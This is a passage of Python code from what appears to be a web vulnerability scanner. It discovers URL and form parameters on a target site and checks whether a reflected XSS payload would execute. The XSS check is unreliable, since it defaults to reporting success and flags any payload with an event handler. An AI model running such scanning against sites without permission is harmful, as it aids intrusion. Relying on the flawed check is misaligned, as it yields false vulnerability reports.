                            'method': 'GET'
                        })
        except:
            pass
        
        # Add endpoints with parameters
        for endpoint in endpoints[:20]:
            try:
                parsed = urlparse(endpoint)
                params = parse_qs(parsed.query)
                
                if params:
                    discovered.append({
                        'url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        'params': {k: v[0] if v else '' for k, v in params.items()},
                        'method': 'GET'
                    })
                else:
                    # Try to discover parameters
                    response = self.session.get(endpoint, timeout=5)
                    forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
                    for form in forms:
                        form_data = self._parse_form(form, endpoint)
                        if form_data:
                            discovered.append(form_data)
            except:
                continue
        
        # Deduplicate
        seen = set()
        unique = []
        for item in discovered:
            key = (item['url'], tuple(sorted(item['params'].keys())))
            if key not in seen:
                seen.add(key)
                unique.append(item)
        
        return unique[:50]  # Limit to 50
    
    def _parse_form(self, form_html, base_url):
        """Parse HTML form to extract action and inputs"""
        try:
            # Get form action
            action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            action = action_match.group(1) if action_match else ''
            action_url = urljoin(base_url, action) if action else base_url
            
            # Get form method
            method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else 'GET'
            
            # Get all inputs
            inputs = re.findall(r'<input[^>]*>', form_html, re.IGNORECASE)
            params = {}
            
            for input_tag in inputs:
                name_match = re.search(r'name=["\']([^"\']+)["\']', input_tag, re.IGNORECASE)
                value_match = re.search(r'value=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
                type_match = re.search(r'type=["\']([^"\']+)["\']', input_tag, re.IGNORECASE)
                
                if name_match:
                    name = name_match.group(1)
                    input_type = type_match.group(1).lower() if type_match else 'text'
                    
                    # Skip submit buttons
                    if input_type not in ['submit', 'button', 'reset']:
                        value = value_match.group(1) if value_match else 'test'
                        params[name] = value
            
            if params:
                return {
                    'url': action_url,
                    'params': params,
                    'method': method
                }
        except:
            pass
        
        return None
    
    def _verify_xss_executable(self, html, payload):
        """Verify if XSS payload is in executable context"""
        # Simple check: payload should not be HTML-encoded
        if '&lt;' in html or '&gt;' in html:
            # Check if our specific payload is encoded
            encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
            if encoded_payload in html:
                return False
        
        # If payload contains script and it's in HTML
        if '<script' in payload.lower() and '<script' in html.lower():
            return True
        
        # If payload contains event handler and it's in tag
        event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover']
        if any(handler in payload.lower() for handler in event_handlers):
            return True
        
        return True  # Default to true if payload is reflected
import time